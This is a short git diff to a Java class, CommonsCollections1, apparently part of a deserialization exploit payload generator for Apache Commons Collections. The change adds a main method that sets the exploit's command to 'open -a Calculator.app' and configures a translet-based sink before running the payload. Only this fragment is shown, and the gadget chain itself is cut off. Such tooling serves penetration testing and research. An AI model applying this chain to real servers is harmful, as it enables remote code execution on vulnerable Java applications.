@@ -1,5 +1,6 @@
 package com.ppp.chain.commonscollections3;
 
+import com.ppp.JavaClassHelper;
 import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
@@ -7,6 +8,7 @@ import com.ppp.annotation.Dependencies;
 import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
+import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.Reflections;
 import org.apache.commons.collections.Transformer;
@@ -26,7 +28,16 @@ import java.util.Map;
 public class CommonsCollections1 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections1.class, args);
+//        PayloadRunner.run(CommonsCollections1.class, args);
+
+        SinksHelper sinksHelper = new SinksHelper();
+        sinksHelper.setSink(CommonsCollections1.class.getAnnotation(Sink.class).value()[0]);
+        sinksHelper.setEnchant(EnchantType.DEFAULT);
+        sinksHelper.setCommand("open -a Calculator.app");
+        JavaClassHelper javaClassHelper = new JavaClassHelper();
+        javaClassHelper.setExtendsAbstractTranslet(true);
+        sinksHelper.setJavaClassHelper(javaClassHelper);
+        PayloadRunner.run(CommonsCollections1.class, args, sinksHelper);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
